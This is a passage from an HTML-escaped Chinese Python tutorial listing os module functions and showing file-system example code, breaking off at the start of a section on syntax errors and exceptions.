&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;43&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-read.html&#34;&gt;os.read(fd, n)&lt;/a&gt; 从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;44&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-readlink.html&#34;&gt;os.readlink(path)&lt;/a&gt; 返回软链接所指向的文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;45&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-remove.html&#34;&gt;os.remove(path)&lt;/a&gt; 删除路径为path的文件。如果path 是一个文件夹，将抛出OSError; 查看下面的rmdir()删除一个 directory。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;46&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-removedirs.html&#34;&gt;os.removedirs(path)&lt;/a&gt; 递归删除目录。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;47&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-rename.html&#34;&gt;os.rename(src, dst)&lt;/a&gt; 重命名文件或目录，从 src 到 dst&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;48&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-renames.html&#34;&gt;os.renames(old, new)&lt;/a&gt; 递归地对目录进行更名，也可以对文件进行更名。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;49&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-rmdir.html&#34;&gt;os.rmdir(path)&lt;/a&gt; 删除path指定的空目录，如果目录非空，则抛出一个OSError异常。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;50&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-stat.html&#34;&gt;os.stat(path)&lt;/a&gt; 获取path指定的路径的信息，功能等同于C API中的stat()系统调用。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;51&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.stat_float_times(&lt;a href=&#34;https://www.runoob.com/python3/python3-os-stat_float_times.html&#34;&gt;newvalue])&lt;/a&gt; 决定stat_result是否以float对象显示时间戳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;52&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-statvfs.html&#34;&gt;os.statvfs(path)&lt;/a&gt; 获取指定路径的文件系统统计信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;53&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-symlink.html&#34;&gt;os.symlink(src, dst)&lt;/a&gt; 创建一个软链接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;54&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-tcgetpgrp.html&#34;&gt;os.tcgetpgrp(fd)&lt;/a&gt; 返回与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;55&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-tcsetpgrp.html&#34;&gt;os.tcsetpgrp(fd, pg)&lt;/a&gt; 设置与终端fd（一个由os.open()返回的打开的文件描述符）关联的进程组为pg。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;56&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;os.tempnam([dir[, prefix]]) &lt;strong&gt;Python3 中已删除。&lt;/strong&gt;返回唯一的路径名用于创建临时文件。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;57&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;os.tmpfile() &lt;strong&gt;Python3 中已删除。&lt;/strong&gt;返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口，没有文件描述符，将会自动删除。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;58&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;os.tmpnam() &lt;strong&gt;Python3 中已删除。&lt;/strong&gt;为创建一个临时文件返回一个唯一的路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;59&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-ttyname.html&#34;&gt;os.ttyname(fd)&lt;/a&gt; 返回一个字符串，它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联，则引发一个异常。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;60&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-unlink.html&#34;&gt;os.unlink(path)&lt;/a&gt; 删除文件路径&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;61&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-utime.html&#34;&gt;os.utime(path, times)&lt;/a&gt; 返回指定的path文件的访问和修改的时间。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;62&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;[os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])](&lt;a href=&#34;https://www.runoob.com/python3/python3-os-walk.html&#34;&gt;https://www.runoob.com/python3/python3-os-walk.html&lt;/a&gt;) 输出在文件夹中的文件名通过在树中游走，向上或者向下。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;63&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-write.html&#34;&gt;os.write(fd, str)&lt;/a&gt; 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;64&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-path.html&#34;&gt;os.path 模块&lt;/a&gt; 获取文件的属性信息。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;65&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-os-pardir.html&#34;&gt;os.pardir()&lt;/a&gt; 获取当前目录的父目录，以字符串形式显示目录名。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; stat

ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;access&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;F_OK&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;F_OK - 返回值 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# F_OK - 返回值 True&lt;/span&gt;
ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;access&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;R_OK&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;R_OK - 返回值 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# R_OK - 返回值 True&lt;/span&gt;
ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;access&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;W_OK&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;W_OK - 返回值 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# W_OK - 返回值 True&lt;/span&gt;
ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;access&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;X_OK&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;X_OK - 返回值 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# X_OK - 返回值 True&lt;/span&gt;

path &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;D:/&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 查看当前工作目录&lt;/span&gt;
retval &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getcwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;当前工作目录为 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; retval&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;当前工作目录 : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getcwdb&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 当前工作目录为 F:\&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 修改当前工作目录&lt;/span&gt;
os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;chdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 查看修改后的工作目录&lt;/span&gt;
retval &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getcwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;目录修改成功 %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; retval&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 目录修改成功 D:\&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# path = &#39;/tmp/foo.txt&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 为文件设置标记，使得它不能被重命名和删除&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# flags = stat.SF_NOUNLINK&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# retval = os.chflags(path, flags)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;返回值: %s&#34; % retval)&lt;/span&gt;


path &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;D:/test.txt&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stat

&lt;span class=&#34;token comment&#34;&gt;# 设置文件可以通过用户组执行&lt;/span&gt;
os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;chmod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stat&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;S_IXGRP&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 设置文件可以被其他用户写入&lt;/span&gt;
os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;chmod&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;D:/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stat&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;S_IWOTH&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;修改成功!!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 设置所有者 ID 为 100&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.chown(&#34;/tmp/foo.txt&#34;, 100, -1)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;修改权限成功!!&#34;)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# 设置根目录为 /tmp&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.chroot(&#34;/tmp&#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;修改根目录成功!!&#34;)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# 打开文件&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# fd = os.open(&#34;foo.txt&#34;, os.O_RDWR | os.O_CREAT)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# #  写入字符串&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.write(fd, &#34;This is test&#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# d_fd = os.dup( fd )&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 关闭文件&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.close(fd)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;关闭文件成功!!&#34;)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# 创建的目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# path = &#34;/tmp/home/monthly/daily/hourly&#34;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.mkdir(path, 0o755)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;目录已创建&#34;)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# 创建的目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# path = &#34;/tmp/hourly&#34;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.mkfifo(path, 0o644)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;路径被创建&#34;)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# # 列出目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;目录为: %s&#34; % os.listdir(os.getcwd()))&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 移除&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.remove(&#34;aa.txt&#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 移除后列出目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;移除后 : %s&#34; % os.listdir(os.getcwd()))&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# os.renames(old, new)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# # 列出目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;目录为: %s&#34;%os.listdir(os.getcwd()))&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 删除路径&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.rmdir(&#34;mydir&#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 列出重命名后的目录&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;目录为: %s&#34; %os.listdir(os.getcwd())&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# # 显示文件 &#34;a2.py&#34; 信息&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# statinfo = os.stat(&#39;a2.py&#39;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(statinfo)&lt;/span&gt;


&lt;span class=&#34;token comment&#34;&gt;# # 打开文件&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# fd = os.open(&#34;f1.txt&#34;, os.O_RDWR | os.O_CREAT)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 写入字符串&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# str = &#34;This is runoob.com site&#34;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ret = os.write(fd, bytes(str, &#39;UTF-8&#39;))&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 输入返回值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;写入的位数为: &#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(ret)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;写入成功&#34;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# # 关闭文件&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# os.close(fd)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print(&#34;关闭文件成功!!&#34;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;错误和异常&#34;&gt;&lt;a href=&#34;#错误和异常&#34; class=&#34;headerlink&#34; title=&#34;错误和异常&#34;&gt;&lt;/a&gt;错误和异常&lt;/h2&gt;&lt;h3 id=&#34;语法错误&#34;&gt;&lt;a href=&#34;#语法错误&#34; class=&#34;headerlink&#34; title=&#34;语法错误&#34;&gt;&lt;/a&gt;语法错误&lt;/h3&gt;&lt;p&gt;一般为漏写符号，或者拼写错误报错&lt;/p&gt;
&lt;p&gt;语法分析器指出了出错的一行，并且在最先找到的错误的位置标记一个小小的箭头&lt;/p&gt;
&lt;h3 id=&#34;异常&#34;&gt;&lt;a href=&#34;#异常&#34; class=&#34;headerlink&#34; title=&#34;异常&#34;&gt;&lt;/a&gt;异常&lt;/h3&gt;&lt;p&gt;即便 Python 程序的语法是正确的，在运行它的时候，也有可能发生错误。运行期检测到的错误被称为异常&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 除数不能为0报异常&lt;/span&gt;
